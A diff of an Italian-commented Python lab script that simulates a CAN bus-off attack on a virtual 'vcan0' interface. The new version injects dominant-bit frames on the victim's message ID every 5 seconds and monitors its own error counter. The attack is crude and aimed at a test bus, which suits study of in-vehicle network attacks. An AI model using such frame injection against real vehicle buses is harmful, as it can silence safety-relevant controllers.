@@ -1,93 +1,97 @@
 import can
 import time
-import sys
+import subprocess
+import re
 
-# Configurazione
+# --- CONFIGURAZIONE ---
 CAN_INTERFACE = 'vcan0'
 TARGET_ID = 0x123 
-BUS_OFF_THRESHOLD = 256
-TEC_PASSIVE_THRESHOLD = 128
-INITIAL_TEC = 0
-MAX_ATTACKS = 100 # Limite per evitare loop infiniti
+ATTACK_PERIOD_SEC = 5.0 # Deve essere uguale al periodo della Vittima
+# ----------------------
+
+def get_tec_info(interface):
+    """
+    Legge il valore di TEC (Transmit Error Counter) e lo stato del bus dal kernel.
+    """
+    try:
+        command = ['ip', '-details', 'link', 'show', interface]
+        result = subprocess.run(command, capture_output=True, text=True, check=True)
+        output = result.stdout
+        
+        tec_match = re.search(r'tec\s+(\d+)\s+rec\s+(\d+)', output)
+        state_match = re.search(r'state\s+(\S+)', output) 
+
+        tec_value = int(tec_match.group(1)) if tec_match else -1
+        state = state_match.group(1).split('-')[0] if state_match else "UNKNOWN"
+        
+        return tec_value, state
+            
+    except Exception as e:
+        return -2, "ERROR"
 
 def start_attacker():
-    """Simula l'attaccante che inietta messaggi malevoli."""
+    """Simula l'attaccante che inietta messaggi malevoli in sync con la Vittima."""
     
     try:
         bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')
-        print(f"✅ Attaccante connesso a {CAN_INTERFACE}.")
+        print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")
     except OSError as e:
-        print(f"❌ Errore di connessione a {CAN_INTERFACE}: {e}")
+        print(f"❌ [Attaccante] Errore di connessione a {CAN_INTERFACE}: {e}")
         return
 
-    # TEC SIMULATI secondo le regole delle slide
-    victim_tec = INITIAL_TEC
-    adversary_tec = INITIAL_TEC
     attack_counter = 0
 
-    print("\n--- SIMULAZIONE ATTACCO BUS-OFF AVVIATA ---")
-    print("Regole TEC: V (Vittima), A (Attaccante)")
-    print(f"Fase 1: V_TEC += 8, A_TEC += 8 (Fino a TEC > {TEC_PASSIVE_THRESHOLD})")
-    print(f"Fase 2: V_TEC += 7, A_TEC -= 1 (Fino a TEC >= {BUS_OFF_THRESHOLD})")
-    print("------------------------------------------")
+    print("\n--- ATTACCO BUS-OFF SIMPLIFICATO AVVIATO ---")
+    print(f"Periodo di Attacco (sincronizzato): {ATTACK_PERIOD_SEC} secondi")
+    print("---------------------------------------------")
 
-    while victim_tec < BUS_OFF_THRESHOLD and attack_counter < MAX_ATTACKS:
-        
-        # 1. Determinazione della Fase e delle regole TEC
-        if victim_tec < TEC_PASSIVE_THRESHOLD:
-            # Fase 1: Vittima Error-Active [cite: 77]
-            # Entrambi salgono di 8 a causa dell'errore attivo [cite: 76]
-            victim_tec_change = 8
-            adversary_tec_change = 8
-            fase_desc = "Fase 1 (Active)"
-            
-        else:
-            # Fase 2: Vittima Error-Passive 
-            # La Vittima sale di 8, ma scende di 1 per la corretta esecuzione del ciclo/Passive Flag 
-            # L'Attaccante scende di 1 per la trasmissione riuscita 
-            victim_tec_change = 7 
-            adversary_tec_change = -1 
-            fase_desc = "Fase 2 (Passive)"
+    while True:
+        # 1. MONITORAGGIO TEC REALE PROPRIO
+        tec_real, status_real = get_tec_info(CAN_INTERFACE)
 
+        print(f"\n--- CICLO ATTACCANTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
+        print(f"🔬 [Attaccante] TEC REALE: {tec_real}. Stato Kernel: {status_real}")
         
-        # 2. Aggiornamento TEC SimulatI
-        victim_tec += victim_tec_change
-        adversary_tec += adversary_tec_change
-        
-        # 3. Messaggio di Stato
-        print(f"[{fase_desc} - Attacco #{attack_counter+1:02d}] TEC Sim: V={victim_tec} ({victim_tec_change:+d}), A={adversary_tec} ({adversary_tec_change:+d})")
-        
-        # 4. Controllo critico dell'Attaccante
-        if adversary_tec >= BUS_OFF_THRESHOLD:
-            print("🚨🚨 [Attaccante] ERRORE: L'Attaccante sta per andare in Bus Off. Interrompo l'attacco!")
+        # 2. CONTROLLO BUS OFF PROPRIO
+        if status_real == "BUS": 
+            print("🚨🚨 [Attaccante] BUS OFF RILEVATO! L'attaccante si è auto-disattivato.")
             break
         
-        # 5. Iniezione del messaggio malevolo (stesso ID e almeno 1 bit dominante in meno)
-        # Sfruttiamo il fatto che l'ID è lo stesso, ma il campo Dati/DLC è modificato (dominante 0)
+        # 3. INIEZIONE DEL MESSAGGIO MALEVOLO
         try:
+            # Il messaggio contiene dati (0x00) che causano l'errore bit/stuffing 
+            # quando la Vittima sta trasmettendo il suo messaggio periodico.
             msg = can.Message(
                 arbitration_id=TARGET_ID,
-                data=[0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00], # Dati con bit Dominanti (0) per forzare l'errore [cite: 54, 87]
+                data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
                 is_extended_id=False
             )
             bus.send(msg)
+            print(f"💣 [Attaccante] Messaggio malevolo iniettato. Attesa {ATTACK_PERIOD_SEC}s...")
             
-        except can.CanError:
-            # Questo errore si verifica se l'attaccante stesso va Bus Off (gestito sopra)
-            # o per errori di sincronizzazione sul bus.
-            print("⚠️ [Attaccante] Errore durante l'invio del messaggio d'attacco.")
+        except can.CanError as e:
+            print(f"⚠️ [Attaccante] Errore durante l'invio: {e}. Interrompo.")
             break
 
         attack_counter += 1
-        time.sleep(0.01) # Ciclo di attacco più veloce del ciclo Vittima per sincronizzazione
+        time.sleep(ATTACK_PERIOD_SEC) 
 
-    print("\n------------------------------------------")
-    if victim_tec >= BUS_OFF_THRESHOLD:
-        print(f"🎉 VITTORIA! La Vittima ha raggiunto TEC={victim_tec} ed è in Bus Off dopo {attack_counter} attacchi.")
-    else:
-        print("🛑 Attacco interrotto prematuramente.")
-        
     bus.shutdown()
+    print("\n🛑 [Attaccante] Disconnesso.")
 
 if __name__ == '__main__':
+    # Esegui la stessa funzione di utilità nel contesto dello script per l'Attaccante
+    def get_tec_info(interface):
+        try:
+            command = ['ip', '-details', 'link', 'show', interface]
+            result = subprocess.run(command, capture_output=True, text=True, check=True)
+            output = result.stdout
+            tec_match = re.search(r'tec\s+(\d+)\s+rec\s+(\d+)', output)
+            state_match = re.search(r'state\s+(\S+)', output)
+            tec_value = int(tec_match.group(1)) if tec_match else -1
+            state = state_match.group(1).split('-')[0] if state_match else "UNKNOWN"
+            return tec_value, state
+        except Exception:
+            return -2, "ERROR"
+
     start_attacker()
